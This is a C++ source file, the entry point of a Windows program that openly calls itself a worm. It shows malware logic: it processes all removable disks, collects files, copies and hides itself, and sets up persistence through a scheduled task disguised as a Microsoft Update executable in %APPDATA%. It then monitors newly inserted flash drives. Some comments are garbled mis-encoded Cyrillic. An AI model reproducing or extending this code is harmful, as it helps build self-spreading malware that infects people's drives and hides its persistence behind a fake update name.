#include "worm.h"



int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nCmdShow)

{
#ifdef _DEBUG
	attach_console();
#endif

	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);

	std::locale loc("ru_RU.UTF-8");  // èëè std::locale loc("");
	std::wcout.imbue(loc);
	std::wcerr.imbue(loc);

	setlocale(LC_ALL, ".UTF8");
	
	//setlocale(LC_ALL, "Russian");
	worm worm1;
	worm::instance =&worm1;
	//worm worm1("E:\\test_worm", 1);
	worm1.worm_was_started();


	/*wcout << L"ÑÏÈÑÎÊ ÂÑÅÕ ÂÍÅØÍÈÕ ÍÎÑÈÒÅËÅÉ" << endl;
	for (const auto& a1 : get_removable_volume_paths()) {
		wcout << a1 << endl;
	};*/
	
	
	
	
	worm1.process_all_removable_disks();

	worm1.scan_all_volumes();
	worm1.print_list_dir();
	worm1.collect_visible_files();
	//worm1.replicate_files(5);
	worm1.copy_and_hide_worm();
	worm1.create_scheduled_task(L"%APPDATA%\\Microsoft\\Update\\update.exe");

	//worm1.print_file_to_copy();

	worm1.worm_was_end();
	return worm1.run_device_monitor(hInstance); // çàïóñê ìîíèòîðèíãà ôëåøåê
	
	
	//wcout<<get_own_path();
}